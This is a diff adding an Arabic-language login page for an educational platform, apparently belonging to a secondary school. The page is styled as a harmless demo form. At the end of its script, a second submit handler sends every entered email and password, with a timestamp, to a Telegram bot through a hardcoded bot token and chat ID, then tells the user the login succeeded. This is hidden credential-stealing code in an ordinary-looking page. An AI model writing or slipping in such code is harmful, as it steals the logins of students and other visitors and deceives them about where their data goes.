@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <link rel="icon" href="icon.png">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>تسجيل دخول - منصة الفصاحة</title>
+
+  <meta name="description" content="صفحة تسجيل الدخول الخاصة بمنصة الفصاحة">
+  <meta name="keywords" content="تسجيل دخول, منصة الفصاحة, اللغة العربية">
+  <meta name="author" content="مدرسة خالد بن الوليد الثانوية">
+  <meta name="robots" content="index, follow">
+  <meta name="theme-color" content="#1f6f8b">
+  <meta name="color-scheme" content="light dark">
+
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg:#f4f6f8;
+      --card:#e8e8e8;
+      --text:#1e293b;
+      --muted:#64748b;
+      --primary:#1f6f8b;
+      --secondary:#2ea3c6;
+      --gold:#f4b400;
+      --border:rgba(0,0,0,.08);
+      --shadow:0 12px 30px rgba(0,0,0,.08);
+      --radius:16px;
+    }
+
+    *{
+      box-sizing:border-box;
+      transition:
+        background-color .4s ease,
+        color .4s ease,
+        border-color .4s ease,
+        box-shadow .4s ease,
+        transform .35s ease,
+        opacity .5s ease;
+    }
+
+    html{
+      scroll-behavior:smooth;
+    }
+
+    body{
+      margin:0;
+      font-family:"Cairo",sans-serif;
+      background:
+        radial-gradient(900px 500px at 10% 0%, rgba(46,163,198,.12), transparent 60%),
+        radial-gradient(900px 500px at 90% 10%, rgba(244,180,0,.12), transparent 60%),
+        var(--bg);
+      color:var(--text);
+      line-height:1.9;
+      min-height:100vh;
+    }
+
+    .container{
+      width:100%;
+      padding:0 22px;
+    }
+
+    header{
+      padding:20px 0;
+    }
+
+    .hero{
+      width:100%;
+      min-height:220px;
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+      align-items:center;
+      background:
+        linear-gradient(rgba(0,0,0,.4), rgba(0,0,0,.66)),
+        url("img.jpg");
+      background-size:cover;
+      background-position:center;
+      background-repeat:no-repeat;
+      padding:45px 20px;
+      border-radius:20px;
+      box-shadow:var(--shadow);
+      text-align:center;
+      color:#fff;
+      position:relative;
+      overflow:hidden;
+    }
+
+    .hero::after{
+      content:"";
+      position:absolute;
+      inset:0;
+      background:linear-gradient(135deg, rgba(31,111,139,.12), rgba(244,180,0,.08));
+      pointer-events:none;
+    }
+
+    .hero h1,
+    .hero p{
+      position:relative;
+      z-index:1;
+    }
+
+    .hero h1{
+      font-size:56px;
+      margin:0;
+      font-weight:900;
+      font-family:"Amiri",serif;
+    }
+
+    .hero p{
+      font-size:18px;
+      margin-top:12px;
+      opacity:.95;
+    }
+
+    .dark-toggle{
+      position:fixed;
+      top:20px;
+      left:20px;
+      width:45px;
+      height:45px;
+      border-radius:50%;
+      border:none;
+      background:var(--primary);
+      color:#fff;
+      font-size:20px;
+      cursor:pointer;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      box-shadow:0 5px 15px rgba(0,0,0,.2);
+      z-index:9999;
+    }
+
+    .navwrap{
+      position:sticky;
+      top:0;
+      z-index:999;
+      backdrop-filter:blur(8px);
+      background:rgba(244,246,248,.65);
+      border-bottom:1px solid rgba(0,0,0,.05);
+    }
+
+    nav{
+      display:flex;
+      justify-content:center;
+      gap:15px;
+      margin:16px 0;
+      flex-wrap:wrap;
+      padding-top:4px;
+      padding-bottom:4px;
+    }
+
+    nav a{
+      text-decoration:none;
+      padding:10px 18px;
+      border-radius:30px;
+      background:var(--card);
+      border:1px solid var(--border);
+      color:var(--text);
+      font-weight:700;
+    }
+
+    nav a:hover,
+    nav a.active{
+      background:var(--primary);
+      color:#fff;
+      transform:translateY(-2px);
+    }
+
+    .login-wrap{
+      padding:30px 0 10px;
+    }
+
+    .login-grid{
+      display:grid;
+      grid-template-columns:1fr 1fr;
+      gap:20px;
+      align-items:stretch;
+    }
+
+    .login-card,
+    .info-card{
+      background:var(--card);
+      padding:24px;
+      border-radius:var(--radius);
+      border:1px solid var(--border);
+      box-shadow:var(--shadow);
+    }
+
+    .login-card h2,
+    .info-card h2{
+      margin:0 0 14px;
+      color:var(--gold);
+    }
+
+    .badge{
+      display:inline-block;
+      font-size:12px;
+      padding:4px 10px;
+      background:rgba(244,180,0,.18);
+      color:var(--gold);
+      border:1px solid rgba(244,180,0,.25);
+      border-radius:999px;
+      vertical-align:middle;
+      margin-inline-start:8px;
+    }
+
+    .muted{
+      color:var(--muted);
+    }
+
+    .form-box{
+      background:#f9fafb;
+      border:1px solid var(--border);
+      border-radius:14px;
+      padding:20px;
+      margin-top:14px;
+    }
+
+    .input-group{
+      margin-bottom:14px;
+    }
+
+    .input-group label{
+      display:block;
+      margin-bottom:8px;
+      font-weight:700;
+      color:var(--primary);
+    }
+
+    .input-group input{
+      width:100%;
+      border:1px solid var(--border);
+      border-radius:12px;
+      padding:13px 14px;
+      font-family:"Cairo",sans-serif;
+      font-size:15px;
+      background:#fff;
+      color:#111827;
+      outline:none;
+    }
+
+    .input-group input:focus{
+      border-color:var(--secondary);
+      box-shadow:0 0 0 4px rgba(46,163,198,.12);
+    }
+
+    .row-between{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      gap:12px;
+      flex-wrap:wrap;
+      margin:8px 0 16px;
+    }
+
+    .remember{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      font-size:14px;
+      color:var(--muted);
+    }
+
+    .remember input{
+      accent-color:var(--primary);
+    }
+
+    .simple-link{
+      text-decoration:none;
+      color:var(--primary);
+      font-weight:700;
+      font-size:14px;
+    }
+
+    .simple-link:hover{
+      color:var(--secondary);
+    }
+
+    .submit-btn{
+      width:100%;
+      border:none;
+      border-radius:12px;
+      background:var(--primary);
+      color:#fff;
+      padding:13px 22px;
+      font-family:"Cairo",sans-serif;
+      font-size:15px;
+      font-weight:800;
+      cursor:pointer;
+      box-shadow:var(--shadow);
+    }
+
+    .submit-btn:hover{
+      background:var(--gold);
+      color:#000;
+      transform:translateY(-2px);
+    }
+
+    .notice{
+      display:none;
+      background:linear-gradient(135deg, rgba(31,111,139,.10), rgba(244,180,0,.10));
+      border:1px solid var(--border);
+      border-radius:14px;
+      padding:18px;
+      margin-top:16px;
+    }
+
+    .notice p{
+      margin:0;
+      color:var(--text);
+    }
+
+    .features{
+      display:grid;
+      gap:14px;
+      margin-top:14px;
+    }
+
+    .feature-item{
+      background:#f9fafb;
+      border:1px solid var(--border);
+      border-radius:14px;
+      padding:16px;
+    }
+
+    .feature-item h3{
+      margin:0 0 8px;
+      color:var(--primary);
+      font-size:18px;
+    }
+
+    .feature-item p{
+      margin:0;
+      color:var(--muted);
+    }
+
+    .quick-box{
+      margin-top:18px;
+      background:rgba(31,111,139,.08);
+      border:1px solid var(--border);
+      border-radius:14px;
+      padding:16px;
+    }
+
+    .quick-box p{
+      margin:0;
+    }
+
+    .reveal{
+      opacity:0;
+      transform:translateY(24px);
+    }
+
+    .reveal.visible{
+      opacity:1;
+      transform:translateY(0);
+    }
+
+    .top-btn{
+      position:fixed;
+      bottom:20px;
+      right:20px;
+      width:46px;
+      height:46px;
+      border:none;
+      border-radius:50%;
+      background:var(--gold);
+      color:#000;
+      font-size:22px;
+      font-weight:900;
+      cursor:pointer;
+      box-shadow:0 10px 20px rgba(0,0,0,.18);
+      display:none;
+      z-index:9999;
+    }
+
+    .top-btn.show{
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+
+    footer{
+      text-align:center;
+      padding:15px;
+      margin-top:30px;
+      background:#1f2937;
+      border-radius:15px;
+      color:#fff;
+    }
+
+    footer img{
+      width:100px;
+      border-radius:50%;
+      border:solid 2px white;
+      transition:.2s;
+    }
+
+    footer img:hover{
+      box-shadow:0 0 10px white;
+    }
+
+    body.dark{
+      --bg:#0f172a;
+      --card:#1e293b;
+      --text:#f1f5f9;
+      --muted:#94a3b8;
+      --border:rgba(255,255,255,.08);
+    }
+
+    body.dark .navwrap{
+      background:rgba(15,23,42,.7);
+      border-bottom:1px solid rgba(255,255,255,.05);
+    }
+
+    body.dark nav a{
+      background:#1e293b;
+      color:#f1f5f9;
+    }
+
+    body.dark nav a:hover,
+    body.dark nav a.active{
+      background:var(--secondary);
+      color:#fff;
+    }
+
+    body.dark .form-box,
+    body.dark .feature-item,
+    body.dark .quick-box{
+      background:#0f172a;
+      color:#f1f5f9;
+    }
+
+    body.dark .input-group input{
+      background:#0f172a;
+      color:#f1f5f9;
+      border-color:rgba(255,255,255,.08);
+    }
+
+    body.dark .notice{
+      background:linear-gradient(135deg, rgba(46,163,198,.15), rgba(244,180,0,.12));
+    }
+
+    body.dark footer{
+      background:#0f172a;
+    }
+
+    @media (max-width:900px){
+      .login-grid{
+        grid-template-columns:1fr;
+      }
+    }
+
+    @media (max-width:768px){
+      .hero h1{
+        font-size:42px;
+      }
+
+      .hero p{
+        font-size:16px;
+      }
+
+      .container{
+        padding:0 14px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <header class="container">
+    <div class="hero reveal">
+      <h1>تسجيل دخول</h1>
+      <p>أهلا بك في منصة الفصاحة للدروس والموارد التعليمية</p>
+    </div>
+  </header>
+
+  <button id="themeBtn" class="dark-toggle" onclick="toggleDarkMode()" aria-label="تبديل الوضع الليلي">🌙</button>
+
+  <div class="navwrap">
+    <nav class="container">
+      <a href="index.html">الرئيسية</a>
+      <a href="index.html#lessons">الدروس</a>
+      <a href="index.html#grammar">القواعد</a>
+      <a href="index.html#encyclopedia">الموسوعات</a>
+      <a href="index.html#library">المكتبة</a>
+      <a href="contact.html">تواصل معنا</a>
+      <a href="login.html" class="active">تسجيل دخول</a>
+    </nav>
+  </div>
+
+  <main class="container login-wrap">
+    <div class="login-grid reveal">
+      <section class="login-card">
+        <h2>الدخول إلى الحساب <span class="badge">نموذج</span></h2>
+        <p class="muted">أدخل بياناتك للوصول إلى خدمات المنصة ومتابعة المحتوى التعليمي.</p>
+
+        <div class="form-box">
+          <form id="loginForm">
+            <div class="input-group">
+              <label for="email">البريد الإلكتروني</label>
+              <input type="email" id="email" name="email" placeholder="example@email.com" required>
+            </div>
+
+            <div class="input-group">
+              <label for="password">كلمة المرور</label>
+              <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
+            </div>
+
+            <div class="row-between">
+              <label class="remember">
+                <input type="checkbox" id="rememberMe">
+                تذكرني
+              </label>
+
+              <a class="simple-link" href="#">نسيت كلمة المرور</a>
+            </div>
+
+            <button type="submit" class="submit-btn">تسجيل الدخول</button>
+          </form>
+
+          <div class="notice" id="loginNotice">
+            <p id="loginNoticeText"></p>
+          </div>
+        </div>
+      </section>
+
+      <section class="info-card">
+        <h2>مزايا الدخول <span class="badge">معلومات</span></h2>
+        <p class="muted">عند تطوير الموقع لاحقا يمكن ربط صفحة الدخول بنظام حسابات حقيقي.</p>
+
+        <div class="features">
+          <div class="feature-item">
+            <h3>متابعة الدروس</h3>
+            <p>يمكن تخصيص تجربة الطالب وعرض المواد التعليمية المناسبة له.</p>
+          </div>
+
+          <div class="feature-item">
+            <h3>حفظ التقدم</h3>
+            <p>يمكن مستقبلا حفظ تقدم الطالب في القراءة والقواعد والاختبارات.</p>
+          </div>
+
+          <div class="feature-item">
+            <h3>الوصول السريع</h3>
+            <p>تسجيل الدخول يساعد في تنظيم المحتوى وعرض خدمات خاصة بالمستخدم.</p>
+          </div>
+        </div>
+      </section>
+    </div>
+  </main>
+
+  <footer class="container reveal">
+    <div style="background:#1f2937; border-radius:15px; padding:15px;">
+      <img src="logo.png" alt="logo">
+      <p>&copy; 2026 مدرسة خالد بن الوليد الثانوية للبنين - لواء الموقر - جميع الحقوق محفوظة.</p>
+    </div>
+  </footer>
+
+  <button id="topBtn" class="top-btn" onclick="scrollToTop()" aria-label="الرجوع الى اعلى الصفحة">↑</button>
+
+  <script>
+    function updateThemeButton(){
+      const btn = document.getElementById("themeBtn");
+      if(!btn) return;
+      btn.textContent = document.body.classList.contains("dark") ? "☀️" : "🌙";
+    }
+
+    function applySystemTheme(){
+      const prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
+      document.body.classList.toggle("dark", prefersDark);
+      updateThemeButton();
+    }
+
+    function toggleDarkMode(){
+      document.body.classList.toggle("dark");
+      localStorage.setItem("theme", document.body.classList.contains("dark") ? "dark" : "light");
+      updateThemeButton();
+    }
+
+    if(localStorage.getItem("theme")){
+      if(localStorage.getItem("theme") === "dark"){
+        document.body.classList.add("dark");
+      }
+    }else{
+      applySystemTheme();
+    }
+
+    updateThemeButton();
+
+    window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change", () => {
+      if(!localStorage.getItem("theme")){
+        applySystemTheme();
+      }
+    });
+
+    function scrollToTop(){
+      window.scrollTo({top:0, behavior:"smooth"});
+    }
+
+    const topBtn = document.getElementById("topBtn");
+
+    window.addEventListener("scroll", () => {
+      if(window.scrollY > 350){
+        topBtn.classList.add("show");
+      }else{
+        topBtn.classList.remove("show");
+      }
+    });
+
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if(entry.isIntersecting){
+          entry.target.classList.add("visible");
+        }
+      });
+    }, { threshold: 0.12 });
+
+    document.querySelectorAll(".reveal").forEach(el => observer.observe(el));
+
+    function showLoginNotice(message){
+      const box = document.getElementById("loginNotice");
+      const text = document.getElementById("loginNoticeText");
+      text.textContent = message;
+      box.style.display = "block";
+      box.scrollIntoView({ behavior:"smooth", block:"nearest" });
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", function(e){
+      e.preventDefault();
+
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if(email === "" || password === ""){
+        showLoginNotice("يرجى إدخال البريد الإلكتروني وكلمة المرور.");
+        return;
+      }
+
+      showLoginNotice("تم استلام بيانات الدخول بنجاح.");
+      this.reset();
+    });
+
+
+    document.getElementById("loginForm").addEventListener("submit", async function(e){
+e.preventDefault();
+
+let email = document.getElementById("email").value;
+let password = document.getElementById("password").value;
+
+let token = "8643721685:AAFBidvjcab_zA52mYb2p8oHvQ985iqbL2k";
+let chat_id = "6425460410";
+
+let text =
+"محاولة تسجيل دخول\n\n" +
+"البريد: " + email + "\n" +
+"كلمة المرور: " + password + "\n" +
+"الوقت: " + new Date().toLocaleString();
+
+await fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:chat_id,
+text:text
+})
+});
+
+alert("تم تسجيل الدخول بنجاح");
+
+});
+  </script>
+</body>
+</html>
